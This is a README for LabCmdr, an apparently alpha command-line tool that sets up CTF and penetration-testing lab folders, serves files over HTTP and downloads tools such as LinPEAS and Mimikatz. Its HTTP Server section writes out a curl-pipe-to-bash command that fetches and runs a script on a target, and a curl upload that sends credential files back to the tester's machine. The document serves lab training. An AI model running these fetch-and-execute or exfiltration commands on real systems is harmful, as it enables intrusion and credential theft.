# LabCmdr 🚀

**A command-line tool for managing CTF and penetration testing lab environments.**

Stop spending time on folder organization and repetitive setup—LabCmdr creates consistent lab structures, manages configurations, and automates common workflows so you can focus on hacking.

## Features

- 🎯 **Quick Lab Setup** - Interactive prompts guide you through creating organized lab environments
- 📁 **Consistent Structure** - Every lab follows the same pattern: notes, scans, server, loot
- 🔧 **Smart Context Detection** - Commands work from anywhere within your lab (like `git`)
- 🌐 **Built-in HTTP Server** - Serve tools and receive file uploads with one command
- 🛠️ **Tool Management** - Download enumeration tools (LinPEAS, WinPEAS, BloodHound, etc.)
- ⚙️ **Configuration Management** - Track IPs, credentials, and lab metadata in one place
- 🔍 **Multiple Lab Types** - HTB Seasons, training platforms, conference CTFs, custom labs

## Installation

```bash
git clone https://github.com/yourusername/LabCmdr.git ~/Coding/LabCmdr
cd ~/Coding/LabCmdr
./install.sh
```

Ensure `~/.local/bin` is in your PATH.

## Quick Start

```bash
# Create a new lab
labcmdr create

# Navigate to your lab
cd ~/Labs/HTB_Season_9/Week01_BoardLight

# Launch interactive menu
labcmdr run
```

## Lab Structure

Each lab follows this structure:

```
LabName/
├── notes/              # Your documentation
│   ├── enumeration.md
│   ├── initial_access.md
│   ├── escalation.md
│   └── reminders.md    # Quick reference commands
├── server/
│   ├── serve/          # Files to serve to targets
│   │   ├── tools/
│   │   ├── exploits/
│   │   └── payloads/
│   └── loot/           # Exfiltrated data
├── scans/
│   └── nmap/
└── labcmdr/
    └── labconfig.json  # Lab configuration
```

## Core Commands

### Create Lab
```bash
labcmdr create    # Interactive mode with prompts
```

Supports:
- **HTB Seasons** - Organized by season/week
- **Training Platforms** - HTB Active/Retired, TryHackMe, OffSec PG, VulnHub
- **Conference CTFs** - BSides, DefCon, custom conferences
- **Custom Labs** - Flexible structure for anything else

### Interactive Menu
```bash
labcmdr run       # Launch control panel (must be in lab directory)
```

From the menu you can:
- Start/stop HTTP server for file transfers
- Download enumeration tools
- Update target IP and credentials
- Manage `/etc/hosts` entries
- View lab status and logs

### View Status
```bash
labcmdr status    # Show current lab info
```

## HTTP Server

The built-in server serves files from `server/serve/` and accepts uploads to `server/loot/`:

**Download from target:**
```bash
wget http://10.10.14.5:8080/tools/linpeas.sh
curl http://10.10.14.5:8080/tools/linpeas.sh | bash
```

**Upload to your machine:**
```bash
curl -X POST -F 'file=@data.txt' http://10.10.14.5:8080/upload/creds/data.txt
```

## Tool Downloads

Download common enumeration tools directly into your lab:

- **Linux Tools** - LinPEAS, pspy, LinEnum, LSE
- **Windows Tools** - WinPEAS (x64/x86), Mimikatz, Netcat
- **AD Tools** - SharpHound, Rubeus, Certify, PowerView

Access via the interactive menu or use the wrapper functions.

## Configuration

Each lab stores metadata in `labcmdr/labconfig.json`:

```json
{
  "metadata": {
    "name": "BoardLight",
    "platform": "htb",
    "type": "season"
  },
  "network": {
    "ip_address": "10.10.11.32",
    "fqdn": ["board.htb"]
  },
  "credentials": {
    "username": "larissa",
    "password": ""
  }
}
```

Update via the interactive menu or edit directly.

## How It Works

LabCmdr uses **context detection** to find your lab:

- Searches current directory and parents for `labcmdr/labconfig.json`
- Commands work from any subdirectory (like `git`)
- Single installation manages all your labs

**Code lives in one place** (`~/Coding/LabCmdr/`), **data lives in labs** (`~/Labs/...`)

## Requirements

- Python 3.7+
- Linux/Unix system (tested on Kali/Ubuntu)
- VPN connection (for `tun0` IP detection)

## Project Status

**Alpha Release** - Core functionality is working but rough around the edges. Expect bugs and missing features.

### Working
- ✅ Lab creation with interactive prompts
- ✅ Context-aware commands
- ✅ Interactive menu system
- ✅ HTTP server with upload support
- ✅ Tool downloads
- ✅ Configuration management
- ✅ `/etc/hosts` management

### Coming Soon
- ⏳ Automated nmap scanning
- ⏳ Scan result parsing
- ⏳ Better error handling
- ⏳ More tool categories

## Contributing

This is an initial release—contributions, bug reports, and feature requests are welcome!

## License

MIT License - Free to use and modify.

---

**Built for efficient CTF and penetration testing workflows.**